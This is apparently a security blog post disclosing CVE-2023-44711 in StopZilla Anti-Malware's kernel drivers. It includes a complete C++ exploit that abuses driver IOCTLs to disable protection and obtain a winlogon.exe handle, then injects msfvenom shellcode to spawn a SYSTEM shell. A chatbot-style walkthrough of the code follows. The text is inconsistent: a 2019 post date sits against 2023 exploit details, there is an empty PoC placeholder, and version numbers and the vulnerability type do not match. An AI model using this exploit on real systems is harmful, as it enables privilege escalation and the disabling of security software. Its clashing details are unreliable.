---
title: CVE-2023-44711 - Exploiting StopZilla Anti-Malware zam64.sys, zamguard64.sys Windows Kernel Driver (Arbitrary Write To Local Privilege Escalation)
author: RashidKhanPathan
date: 2019-08-09 20:55:00 +0800
categories: [Windows]
tags: [exploit writing, windows kernel driver, 0Day,]
pin: true
toc: true
img_path: '/posts/20180809'
---


## **CVE-2023-44711**

### **Vulnerability Description**
Stopzilla AntiMalware v.2.74.115.487 (zam64.sys, zamguard64.sys) are affected by an Incorrect Access Control vulnerability where IOCTL 0x8000204C allows a non-privileged user to open a handle to any privileged process running on the machine.

### **Technical Details**
1. **Vulnerability Type:** Incorrect Access Control
2. **Vendor:** Stopzilla
3. **Affected Product:** Antimalware - 2.74.115.487
4. **Affected Component:** zam64.sys, zamguard64.sys
5. **Attack Type:** Local
6. **Impact:**
   - Code execution: true
   - Escalation of Privileges: true

### **Exploitation**
To exploit the vulnerability, an attacker can follow these steps:
- Craft an exploit in C++ using WindowsAPI functions VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread to write ShellCode into Winlogon.exe.
- The driver's IOCTL 0x8000204C allows a non-privileged user to open a handle to any privileged process running on the machine.
- A non-privileged user can open a handle to the \.\ZemanaAntiMalware device, register within the driver using IOCTL 0x80002010, and send the IOCTL mentioned above to get a handle to any privileged process.
- Attackers could exploit this issue by injecting arbitrary code into the context of the privileged process to achieve local privilege escalation up to NT AUTHORITY\SYSTEM.

### **Proof of Concept (PoC) Code**
```cpp
// Insert your C++ PoC code here
```

### **Additional Information**
[Link to additional information](https://drive.google.com/file/d/1EyLJgwjejYtS6bY5hpkGgGLlc4iRCVLS/view?usp=sharing)

### **Discoverer**
RashidKhan Pathan

### **Reference**
[Link to reference](https://drive.google.com/file/d/1EyLJgwjejYtS6bY5hpkGgGLlc4iRCVLS/view?usp=sharing)

```c++
/*
Exploit title:      StopZilla Anti-Malware 2.74.115.487 Arbitrary Write To Local Privilege Escalation
Exploit Author:     RashidKhan Pathan (0xiHexCoder) - @itRashid - https://rashidkhanpathan.github.io
Date:               9 Sep 2023
Vendor Homepage:    https://www.stopzilla.com/downloads/download-stopzilla-antimalware/
Download:           https://download.stopzilla.com/binaries/stopzilla/anti-malware/STOPzilla_AM_Setup.exe
Affected Version:   StopZilla AntiMalware v. <= 2.74.115.487
CVE:                CVE-2023-XXXX
Tested on:          Windows 10 20H2 x64 Bit
Category:           local exploit
Platform:           windows
Usage:              run Exploit.exe from user to achive NT Authority System Shell
*/

#include <iostream>
#include <windows.h>
#include <string>
#include <tlhelp32.h>


int GetProcessPIDByName(PCSTR ProcessName) {
	// Get HANDLE to ProcessName 
	DWORD pid = 0;
	PROCESSENTRY32 process;

	// Create toolhelp snapshot
	HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes
	if (Process32First(hsnapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on name
			if (std::string(process.szExeFile) == std::string(ProcessName))
			{
				pid = process.th32ProcessID;
				break;
			}
		} while (Process32Next(hsnapshot, &process));
	}

	CloseHandle(hsnapshot);

	if (pid != 0)
	{
		return pid;
	}
	return NULL;
}



int main(int argc, char** argv)
{

	printf("      StopZilla Anti-Malware 2.74.115.487 Arbitrary Write To Local Privilege Escalation \n");
	printf("                              Tested on Windows 10 20H2                                 \n");
	printf("                                   RashidKhan Pathan                                  \n\n");

	HANDLE hDevice, hWinlogon = 0;
	DWORD exploitPID = 0;
	DWORD winlogonPID = 0;
	DWORD disbleZAM = 0;
	DWORD disbleRealTime;
	bool success = 0;
	LPVOID destMem = NULL;
	SIZE_T written = 0;

	/*msfvenom -p windows/x64/exec CMD=cmd.exe EXITFUNC=thread -f c*/
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

	// Obtaining Driver Handle Name Using CreateFileA()
	printf("[*] Obtaining Device Driver Handle \n");
	hDevice = CreateFileA("\\\\.\\ZemanaAntiMalware", GENERIC_READ | GENERIC_WRITE , NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (!hDevice)
	{
		printf("[-] Error - Unable To Obtain Device Driver Handle \n", GetLastError());
		return -1;
	}
	printf("\t[+] Obtained Driver Handle 0x%p \n", hDevice);

	// Getting PID From All Processes Using getProcessId() Function;
	exploitPID = GetCurrentProcessId();
	if (!exploitPID)
	{
		printf("[-] Faild To Get Exploit Process ID \n", GetLastError());
		return -1;
	}
	printf("[+] Exploit Process ID \n", exploitPID);

	// Adding Process To Allowlist
	success = DeviceIoControl(hDevice, 0x80002010, &exploitPID, sizeof(exploitPID), NULL, 0, NULL, NULL);
	if (!success)
	{
		printf("[-] Error - Faild To Add Process To Allowlist", GetLastError());
		return -1;
	}
	printf("[+] Added Process To Allowlist\n");

	// Disabling ZAM Guard And Real-Time Protection
	disbleZAM = DeviceIoControl(hDevice, 0x80002064, NULL, sizeof(exploitPID), NULL, 0, NULL, NULL);
	disbleRealTime = DeviceIoControl(hDevice, 0x80002090, NULL, sizeof(exploitPID), NULL, 0, NULL, NULL);
	if (!disbleZAM || !disbleRealTime)
	{
		printf("[-] Faild To Disable ZAM Guard Or RealTime Protection \n");
		return -1;
	}
	printf("[+] Disabled ZAM Guard And Real Time Protection 0x%p 0x%p \n", disbleZAM, disbleRealTime);

	// Getting The WinLogon PID
	winlogonPID = GetProcessPIDByName("winlogon.exe");
	if (!winlogonPID)
	{
		printf("[-] Error - Unable To Get winlogon.exe PID \n", GetLastError());
	}
	printf("[+] Got Winlogon.exe PID 0x%p \n", winlogonPID);

	success = DeviceIoControl(hDevice, 0x8000204c, &winlogonPID, sizeof(DWORD), &hWinlogon, sizeof(DWORD), NULL, NULL);
	if (!success)
	{
		printf("[+] \n", GetLastError());
	}
	printf("[+] Obtained Winlogon.exe HANDLE 0x%p \n", hWinlogon);

	// Loading ShellCode In Winlogon.exe By Allocating Memory In WinLogon.exe Using VirtuallAllocEx()
	destMem = VirtualAllocEx(hWinlogon, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!destMem)
	{
		printf("[-] Error - Unable Allocated Memory In Winlogon.exe \n", GetLastError());
		return -1;
	}
	printf("[+] Allocated Memory In Winlogn.exe Process 0x%p \n", destMem);

	// Writing ShellCode Within WinLogon.exe Process Memeory
	success = WriteProcessMemory(hWinlogon, destMem, &shellcode, sizeof(shellcode), &written);
	if ((DWORD)success == INVALID_FILE_ATTRIBUTES)
	{
		printf("[-] Faild To Write ShellCode In Winlogon.exe \n", GetLastError());
		return -1;
	}	
	printf("[+] Loaded ShellCode In Winlogon.exe 0x%p 0x%s 0x \n", destMem);

	// Finally Spawing System Shell By Using CreateRemoteThread() Function
	success = CreateRemoteThread(hWinlogon, NULL, 0, (LPTHREAD_START_ROUTINE)destMem, NULL, 0, NULL);
	if (!success)
	{
		printf("[-] Errror - Test");
		return -1;
	}

	printf("[+] We Are Now NT AUTHORITY SYSTEM");
	return 0;
}
```

Certainly! The provided code is an attempt to exploit a local privilege escalation vulnerability in the StopZilla Anti-Malware software. Let's break down the steps outlined in the code:

### Step-by-Step Explanation:

#### 1. Obtaining Device Driver Handle
```cpp
hDevice = CreateFileA("\\\\.\\ZemanaAntiMalware", GENERIC_READ | GENERIC_WRITE , NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
```
The code attempts to acquire a handle (`hDevice`) to the Zemana AntiMalware device driver using `CreateFileA()` function. This step is crucial for interacting with the driver to perform certain actions, but it assumes the existence of a vulnerable or exploitable interface within the driver.

#### 2. Disabling ZAM Guard and Real-Time Protection
```cpp
disbleZAM = DeviceIoControl(hDevice, 0x80002064, NULL, sizeof(exploitPID), NULL, 0, NULL, NULL);
disbleRealTime = DeviceIoControl(hDevice, 0x80002090, NULL, sizeof(exploitPID), NULL, 0, NULL, NULL);
```
The code tries to disable ZAM Guard and Real-Time Protection using `DeviceIoControl()`. It sends IOCTL commands to the driver with specific codes (`0x80002064` and `0x80002090`) to disable these protections. This assumes that the driver has exposed functionalities that can be manipulated for this purpose.

#### 3. Manipulating Winlogon Process
```cpp
winlogonPID = GetProcessPIDByName("winlogon.exe");
```
This retrieves the Process ID (PID) of the "winlogon.exe" process.

```cpp
success = DeviceIoControl(hDevice, 0x8000204c, &winlogonPID, sizeof(DWORD), &hWinlogon, sizeof(DWORD), NULL, NULL);
```
The code communicates with the driver to interact with the Winlogon process, acquiring a handle (`hWinlogon`) to it, assuming that it has privileges to perform these operations.

```cpp
destMem = VirtualAllocEx(hWinlogon, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
```
This allocates memory within the Winlogon process, where arbitrary code can be written.

```cpp
success = WriteProcessMemory(hWinlogon, destMem, &shellcode, sizeof(shellcode), &written);
```
It writes a piece of shellcode (typically used for payload execution) to the allocated memory space within the Winlogon process.

#### 4. Executing Arbitrary Code
```cpp
success = CreateRemoteThread(hWinlogon, NULL, 0, (LPTHREAD_START_ROUTINE)destMem, NULL, 0, NULL);
```
This attempt to spawn a system shell by creating a remote thread in the Winlogon process, executing the loaded shellcode. This step is a common technique for running arbitrary code within a different process, often leading to privilege escalation.

### Important Note:
The code assumes vulnerabilities in the Zemana AntiMalware software and driver, which, if existing and exploitable, could potentially allow an attacker to escalate privileges or execute unauthorized code.

It's crucial to emphasize that attempting to exploit vulnerabilities in software without proper authorization is unethical and illegal. Responsible disclosure of vulnerabilities to software vendors or authorized security organizations is the appropriate way to handle such issues. Unauthorized exploitation can lead to legal consequences and cause harm to systems and users.

The code provided is for educational purposes to understand potential security vulnerabilities and should not be used maliciously.
Vulnerability type: Other
Other Vulnerability type: Arbitrary Write To Local Privilege Escalation
Vendor: Stopzilla
Product: Antimalware
Version: 2.74.115.487
Affected Components: zamguard64.sys, zam64.sys
Description: Stopzilla AntiMalware v.2.74.115.487 (zam64.sys, zamguard64.sys) are affected by an Incorrect Access Control vulnerability where IOCTL 0x8000204C allow a non-privileged user to open a handle to any privileged process running on the machine. A non-privileged user can open a handle to the \.\ZemanaAntiMalware device, register within the driver using IOCTL 0x80002010 and send the IOCTL mentioned above to get a handle to any privileged process. Attackers could exploit this issue by injecting arbitrary code in the context of the privileged process to achieve local privilege escalation up to NT AUTHORITY\SYSTEM.##### StopZilla Anti-Malware 2.74.215.687 Arbitrary Write To Local Privilege Escalation



